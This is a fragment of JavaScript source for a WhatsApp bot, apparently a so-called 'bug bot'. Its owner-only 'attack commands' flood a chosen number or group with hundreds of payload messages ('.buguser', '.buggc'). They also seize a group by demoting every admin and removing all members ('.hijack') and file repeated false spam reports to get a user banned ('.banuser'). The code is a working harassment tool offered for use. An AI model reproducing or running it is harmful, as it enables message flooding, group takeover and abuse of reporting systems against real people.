    if (cmd === `${PREFIX}self` && isOwner) {
        state.selfMode = true
        return api.sendText(chatId, `🔒 *Self Mode ON*\nOnly owners can use the bot.`, qid)
    }

    if (cmd === `${PREFIX}public` && isOwner) {
        state.selfMode = false
        return api.sendText(chatId, `🔓 *Public Mode ON*\nEveryone can use the bot.`, qid)
    }

    // ── OWNER ATTACK COMMANDS ─────────────────────────────────
    if (cmd === `${PREFIX}buguser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .buguser <number> [count]`, qid)
        const count = Math.min(parseInt(args[2]) || 200, 500)
        const jid   = `${target}@s.whatsapp.net`
        state.floodActive[jid] = true
        await api.sendText(chatId, `🐛 Flooding *${target}*... (${count})`, qid)
        let sent = 0
        while (state.floodActive[jid] && sent < count) {
            try { await api.sendText(jid, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]()); if (sent % 5 !== 0) await sleep(100); sent++ }
            catch { await sleep(200) }
        }
        state.floodActive[jid] = false
        return api.sendText(chatId, `✅ Sent *${sent}* to ${target}`, qid)
    }

    if (cmd === `${PREFIX}buggc` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Use inside a group!`, qid)
        const count = Math.min(parseInt(args[1]) || 200, 500)
        state.floodActive[chatId] = true
        await api.sendText(chatId, `🐛 Flooding group... (${count})`, qid)
        let sent = 0
        while (state.floodActive[chatId] && sent < count) {
            try { await api.sendText(chatId, FLOOD_PAYLOADS[sent % FLOOD_PAYLOADS.length]()); if (sent % 5 !== 0) await sleep(100); sent++ }
            catch { await sleep(200) }
        }
        state.floodActive[chatId] = false
        return api.sendText(chatId, `✅ Sent *${sent}* messages!`, qid)
    }

    if (cmd === `${PREFIX}stopflood` && isOwner) {
        const target = digits(args[1])
        const key    = target ? `${target}@s.whatsapp.net` : chatId
        state.floodActive[key] = false
        return api.sendText(chatId, `🛑 Flood stopped!`, qid)
    }

    if (cmd === `${PREFIX}hijack` && isOwner) {
        if (!isGroup) return api.sendText(chatId, `❌ Use inside a group!`, qid)
        await api.sendText(chatId, `⚡ Hijacking...`, qid)
        try {
            const info   = await api.getGroupInfo(chatId)
            if (!info) return api.sendText(chatId, `❌ Could not get group info!`, qid)
            const admins  = info.participants?.filter(p => p.rank === 'admin').map(p => p.id) || []
            const members = info.participants?.map(p => p.id) || []
            if (admins.length) await api.demoteGroupParticipants(chatId, admins).catch(() => {})
            for (let i = 0; i < members.length; i += 5) {
                await api.removeGroupParticipants(chatId, members.slice(i, i + 5)).catch(() => {})
                await sleep(1000)
            }
            return api.sendText(chatId, `⚡ Taken over by ${OWNER_NAME}`)
        } catch (e) {
            return api.sendText(chatId, `❌ Hijack failed: ${e.message}`, qid)
        }
    }

    if (cmd === `${PREFIX}banuser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, `❌ Usage: .banuser <number>`, qid)
        await api.sendText(chatId, `🚨 Reporting *${target}*...`, qid)
        let reported = 0
        for (let i = 0; i < 5; i++) {
            try {
                await api.request('post', '/contacts/report', { contact_id: `${target}@s.whatsapp.net`, reason: 'spam' })
                reported++
                await sleep(500)
            } catch {}
        }
        return api.sendText(chatId, `✅ *${target}* reported ${reported}/5 times!`, qid)
    }
}

module.exports = { handleCommand }
